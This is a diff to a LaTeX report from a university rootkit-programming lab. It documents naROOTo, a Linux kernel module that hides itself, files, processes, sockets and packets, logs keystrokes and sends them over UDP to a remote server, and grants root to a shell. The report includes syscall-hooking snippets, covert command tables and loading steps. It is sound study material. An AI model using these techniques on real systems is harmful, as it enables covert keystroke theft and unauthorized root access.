@@ -31,7 +31,7 @@ This root-kit has been implemented as part of the "Root-kit programming" lab cou
 It is a single Linux Kernel Module(LKM) and can be inserted into the Linux kernel 3.16 or later versions. 
 It explains how to acheive many root-kit functionalities just by manipulation of kernel data structures and hooking few system calls. 
 Controlled correctly, it does so much work such as hiding files, hiding processes, hiding sockets, keylogging, 
-sending key strokes to remote machine, hiding network packets, previlage escalation.   
+sending key strokes to remote machine, hiding network packets, privilege escalation.   
 
 Compilation, installation and controlling is explained in the coming sections.
 
@@ -44,23 +44,23 @@ This rootkit has been implemented and tested on the following configuration.
 
 \subsection{Building}
         In order to build the module, just cd to source directory and issue 'make' command. 
-	If the setup is correct, it should create our\_module.ko inside the source directory. 
+	If the setup is correct, it should create \texttt{naROOTo}.ko inside the source directory. 
 
 \subsection{Loading}
-        Make sure compilation of root-kit was successful, then just issue 'insmod our\_module.ko', to the module. 
+        Make sure compilation of root-kit was successful, then just issue 'insmod \texttt{naROOTo}.ko', to the module. 
 	Once the module is loaded, it does the following tasks. 
     
 \begin{itemize}
     \item It hides itself from the user. 
-    \item Creates a  file called rootkit\_keylog.log inside the current directory and hides it (It logs any keystorkes entered by the user).
+    \item Creates a  file called rootkit\_keylog.log inside the current directory and hides it (It logs any keystrokes entered by the user).
     \item Hides the process id which provides the remote shell access. 
     \item Hides the network connection to the remote shell and it only accepts connections when you politely knock beforehand.
     \end{itemize}
 
 
 \section{Commands and control}
-    \subsection{Controlling our\_module}
-    Once our\_module is loaded, it can be controlled by covert communication channel to do various jobs. 
+    \subsection{Controlling \texttt{naROOTo}}
+    Once \texttt{naROOTo} is loaded, it can be controlled by covert communication channel to do various jobs. 
 For this, we hook the read system call and intercept data from stdin and take actions for each existing  commands. 
 We use a state machine model (which will be described later) to read the data and look for specific commands entered. 
 
@@ -72,7 +72,7 @@ After the prefix one can enter the actual command. The format of the command loo
 
 After you typed the command, pressing \texttt{return} or \texttt{enter} is not necessary, you can press \texttt{Ctrl + C} to avoid bash error. 
 Our module will execute as soon as the suffix(;) is entered, provided the command exists. 
-The table %ADD table refrence
+The table %ADD table reference
 gives the available commands and their use. 
 
 \begin{table}
@@ -108,10 +108,18 @@ gives the available commands and their use.
 \texttt{f7R\_enable\_net\_keylog\textvisiblespace<ip>;} & To enable network keylogging, ip of the destination must be given\\
 \texttt{f7R\_disable\_net\_keylog;} & To disable network keylogging, no parameter required.\\ \hline
 
+\multicolumn{2}{ |c| }{Port Knocking} \\
+\hline
+\texttt{f7R\_enable\_knocking\_tcp\textvisiblespace<port>;} & To enable port knocking for tcp\\ 
+\texttt{f7R\_disable\_knocking\_tcp\textvisiblespace<port>;} & To disable port knocking for tcp\\ 
+\texttt{f7R\_enable\_knocking\_udp\textvisiblespace<port>;} & To enable port knocking for udp\\ 
+\texttt{f7R\_disable\_knocking\_udp\textvisiblespace<port>;} & To disable port knocking for udp\\ \hline
+
+
 \multicolumn{2}{ |c| }{Previlage escalation} \\
 \hline
-\texttt{f7R\_escalate;} & Type this from any terminal, that will get root previleges.\\ 
-\texttt{f7R\_deescalate;} & Revokes the root previleges of a shell.\\ \hline
+\texttt{f7R\_escalate;} & Type this from any terminal, that will get root privileges.\\ 
+\texttt{f7R\_deescalate;} & Revokes the root privileges of a shell.\\ \hline
 
 \end{tabular}
 \caption{Commands to control the rootkit}
@@ -119,10 +127,10 @@ gives the available commands and their use.
 \end{table}
 
 \section{Implementation}
-This section explains how our\_module is designed and how do we achieve specific functionality. 
+This section explains how \texttt{naROOTo} is designed and how do we achieve specific functionality. 
 
 \subsection{High-level design}
-our\_module is divided into many sub-modules(files). Each submodules have .h (header files) and .c (implemetation files).
+\texttt{naROOTo} is divided into many sub-modules(files). Each submodules have .h (header files) and .c (implemetation files).
 This gives us a lot of flexibility to add or remove any feature.
 
 \texttt{main.c} combines every functionality and that's where we have \texttt{init\_module} and \texttt{cleanup\_module}.
@@ -134,7 +142,7 @@ The following table describes the functionality of each file.
 File name             & Functionality \\
 \hline
 gensysmap.sh & Bach script to generate sysmap.h file\\
-control.\{c,h\} & Manages the data structures for diffrent hiding methods\\
+control.\{c,h\} & Manages the data structures for different hiding methods\\
 include.\{c,h\} & contains many different helper functions   \\
 covert\_communication.\{c,h\} & All functionality needed for the covert communication channel \\
 getdents.\{c,h\} & contains everything needed for the manipulated getdents syscall\\
@@ -165,12 +173,12 @@ Each line of the file looks like,
 #define sysmap_symbol_name address
 \end{verbatim}
 
-When we require a perticular kernel symbol, we can just type cast the corresponding symbol and use it. 
+When we require a particular kernel symbol, we can just type cast the corresponding symbol and use it. 
 
 \texttt{System call table}: The system call table lists the system calls available in that specific Linux kernel version. 
 It could also be thought of as an API for the interface between user space and kernel space. 
 In order to manipulate the system calls(which we explain in upcoming sections), our first job was to access the system call table.
-We can access the sytem call table from the \texttt{sysmap.h} file like this,
+We can access the system call table from the \texttt{sysmap.h} file like this,
 
 \begin{verbatim}
 void **sys_call_table = (void *) sysmap_sys_call_table;
@@ -252,7 +260,7 @@ We can get the information on loaded modules using \texttt{lsmod}
 
 \texttt{Hiding the module from /proc/modules}: All the modules in the kernel are arranged as linked list, 
 where each list of type \texttt{struct module}. \texttt{THIS\_MODULE} macro which points to the current module. 
-To hide it from lsmod we just need to delete the perticular entry from the list of modules. 
+To hide it from lsmod we just need to delete the particular entry from the list of modules. 
 This can be easily achieved via list operations defined in \texttt{list.h}:\texttt{list\_del}, 
 \texttt{list\_add\_tail}, \texttt{list\_add}. Once removed from the list of modules, 
 it will not show up anymore when using \texttt{lsmod}. 
@@ -260,7 +268,7 @@ it will not show up anymore when using \texttt{lsmod}.
 \texttt{Hiding the module from /sys/modules}: Deleting from \texttt{/sys/modules} was a tricky part. 
 Just deleting from the list of modules, will not stop showing it up from \texttt{/sys/modules}.
 This we can do by two different methods. By hacking the \texttt{filldir} function or by deleting it from the 
-kernel file system. If we do this by using first method our\_module will be easily detectable. 
+kernel file system. If we do this by using first method \texttt{naROOTo} will be easily detectable. 
 % add how: One can count the number of modules from 
 So we decided to delete the entry from the kernel file system. \texttt{THIS\_MODULE} points to kernel object. 
 If we delete this kernel object of type \texttt{struct kernfs\_node}, then it will not show up from from \texttt{/sys/modules}. 
@@ -279,9 +287,9 @@ We had the local key-logging already enabled in our root-kit by hooking \texttt{
 We just had to send this keys to \texttt{syslog-ng} server, using syslog protocol. 
 These packets can be sent using \texttt{UDP} packets using \texttt{netpoll} kernel API. 
 The \texttt{netpoll.h} provides the mechanism for sending UDP packets to a remote host. 
-Only one constraint in netpoll is that, the destination port has to be a ethernet port. 
+Only one constraint in netpoll is that, the destination port has to be a Ethernet port. 
 
-Todo this job, we need to first initialize the netpoll structure with IP address, port number etc. 
+To do this function, we need to first initialize the netpoll structure with IP address, port number etc. 
 before using it to send the keys. 
 The \texttt{netpoll} structure looks like this, 
 
@@ -319,7 +327,7 @@ netpoll_send_UDP(np, sned_buf, send_len);
 
 
 \texttt{Setting up syslog-ng server}: One must set the \texttt{syslog-ng} server in the destination. 
-The following steps are for setting the syslog-ng server on ubuntu. 
+The following steps are for setting the syslog-ng server on Ubuntu. 
 \begin{itemize}
 \item Install the syslog-ng server: sudo apt-get install syslog-ng
 
@@ -348,7 +356,7 @@ destination(df_wrt0);
 \end{itemize}
 
 \subsection{Privilege Escalation}
-To give the root privilages to any shell, we have to hack the credentials of the perticular shell and 
+To give the root privileges to any shell, we have to hack the credentials of the particular shell and 
 manipulate them. There is a structure called \texttt{cred}: 
 It holds the credentials of the respective process. These credentials are uids and gids. 
 There are functions available from Linux kernel, to get these credentials and change them. 
@@ -359,7 +367,7 @@ commit_creds(struct cred *);
 \end{verbatim}
 
 Once we get the credentials, we can assign all the ids to 0, and we will give the root access to the shell. 
-Sicne we have hooked read system call, 
+Since we have hooked read system call, 
 we can type \texttt{escalate} from any terminal and it gets the root access. 
 
 \subsection{Socket Hiding}
@@ -399,7 +407,7 @@ we copy the remaining entries and decrease the length of the original function a
 
 \subsection{Packet Hiding}
 Our goal was to hide any network packets from any process which uses libcap to  sniff packets.
-At first we wanted to understand how libcap tools work to sniff packets. \texttt{strace} on tcpdump gave us some usefull information. It uses packet sockets and then socket is polled every second to retrieve the information.   
+At first we wanted to understand how libcap tools work to sniff packets. \texttt{strace} on tcpdump gave us some useful information. It uses packet sockets and then socket is polled every second to retrieve the information.   
 
 \begin{verbatim}
 socket(PF_PACKET, SOCK_RAW, 768)        = 3
@@ -421,8 +429,8 @@ unsigned int *target = (unsigned int *) (hook + 1);
 \end{verbatim} 
 
 In the hooked functions, we call \texttt{is\_packet\_hidden} function with \texttt{struct sk\_buff} as parameter.
-We just extract the ip header from \texttt{sk\_buff} and check if we want to hide this ip address and return the values accrodingly. 
-If we donot want to hide the packet in the hooked function, we just restore original, call it, hook again. 
+We just extract the ip header from \texttt{sk\_buff} and check if we want to hide this ip address and return the values accordingly. 
+If we do not want to hide the packet in the hooked function, we just restore original, call it, hook again. 
   
 \subsection{Port Knocking}
 To implement rudimentary port knocking feature, we accept the service that we want to hide and an ip address 
@@ -455,17 +463,18 @@ When a network packet comes in, it is passed to the netfilter’s first hook \te
 And in the hooked function, we extract the ip header from \texttt{sk\_buff} and check if the port is blocked, depending on that we then craft an appropriate \texttt{REJECT} response. For TCP we send \texttt{TCP RST} and for UDP we send icmp port unreachable. If the port is allowed to connect we send \texttt{NF\_ACCEPT} to allow the connection.
 
 \section{Vulnerabilities}
-Though our\_module can perform operations in stealth mode, our module could be detected via certain methods. 
+Though \texttt{naROOTo} can perform operations in stealth mode, it could be detected via certain methods. 
 
 \texttt{Detection via hooked system calls}: We hook many system calls \texttt{read}, \texttt{getdents} etc. 
 The original address of these functions can be obtained from System map files. 
 If the user writes a module where he checks the address in the system call table against the address from the Sysmap file it can be easily found out, unless we modify the Sysmap file or delete it from the system. 
 
-\texttt{Detection via process ids}
+\texttt{Detection via hidden processes}
 
 \texttt{Detection via hidden files}
 
 \section{Final words}
-
+\texttt{naROOTo} implemented lot of functionalities, This project is a good insight into linux kernel and understanding the root-kits.
+Once Out\_module is in the system, it can gain almost complete access over the system and send the information to the remote system. 
 
 \end{document}
